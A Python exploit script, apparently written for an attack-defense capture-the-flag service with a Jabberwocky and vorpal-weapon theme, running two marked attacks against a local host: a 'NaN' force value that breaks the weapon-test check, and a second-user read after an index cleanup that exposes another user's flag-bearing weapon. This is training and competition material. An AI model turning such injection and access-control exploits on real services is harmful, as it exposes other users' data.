import json
import uuid
from time import sleep

import requests
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry


class Api:
    def __init__(self, hostname):
        self.timeout = 4
        self.hostname = hostname
        self.cookies = {}

    # user
    def register(self, name, password):
        request = {
            "name": name,
            "password": password
        }
        result = self.retryable_requests().post(
            f"http://{self.hostname}/Account/register",
            json=request, timeout=self.timeout
        )

        self.cookies = result.cookies.get_dict()


    def add_claimed_weapon(self, name, is_vorpal, force, flag):
        request = {
            "name": name,
            "isVorpal": is_vorpal,
            "force": force,
            "arcaneProperty": flag
        }
        result = self.retryable_requests().put(
            f"http://{self.hostname}/Weapon/claimed",
            json=request, timeout=self.timeout, cookies=self.cookies
        )

    def get_weapon(self, weapon_name):
        request = {
            "weaponName": weapon_name
        }
        result = self.retryable_requests().post(
            f"http://{self.hostname}/Weapon/weapon",
            json=request, timeout=self.timeout, cookies=self.cookies
        )

        return result.json()

    def get_weapon_list(self):
        result = self.retryable_requests().get(
            f"http://{self.hostname}/Weapon/weaponList",
            timeout=self.timeout, cookies=self.cookies
        )

        return result.json()

    def test_weapon(self, breeding_seed, weapon_name):
        request = {
            "breedingSeed": breeding_seed,
            "weaponName": weapon_name
        }

        result = requests.put(
            f"http://{self.hostname}/Jabberwocky/weaponTestResult",
            json=request, timeout=self.timeout, cookies=self.cookies, verify=False
        )
        return result

    def get_juberwocky_list(self):
        result = self.retryable_requests().get(
            f"http://{self.hostname}/Jabberwocky/jabberwockyList",
            timeout=self.timeout, cookies=self.cookies
        )

        return result.json()

    def retryable_requests(self,
                           retries=3,
                           backoff_factor=0.3,
                           status_forcelist=(400, 409, 500, 502, 504),
                           session=None,
                           ):
        session = session or requests.Session()
        retry = Retry(
            total=retries,
            read=retries,
            connect=retries,
            backoff_factor=backoff_factor,
            status_forcelist=status_forcelist,
        )
        adapter = HTTPAdapter(max_retries=retry)
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        return session


class Object(object):
    pass


api = Api("0.0.0.0:9000")
user = Object()
user.name = str(uuid.uuid4())
user.password = str(uuid.uuid4())
api.register(user.name, user.password)

# Vuln 1.
weapon_name = str(uuid.uuid4())
api.add_claimed_weapon(weapon_name, False, "NaN", "")
jw_list = api.get_juberwocky_list()
w_list = api.get_weapon_list()
result = api.test_weapon(jw_list[0], weapon_name)
print(result.content)

# Vuln 2.
user = Object()
user.name = str(uuid.uuid4())
user.password = str(uuid.uuid4())
api.register(user.name, user.password)
# forbidden weapon claimed
result = api.get_weapon(weapon_name)
print(result)
sleep(60 * 11)
# index cleaned up weapon shared
weapon = api.get_weapon(weapon_name)
print(weapon)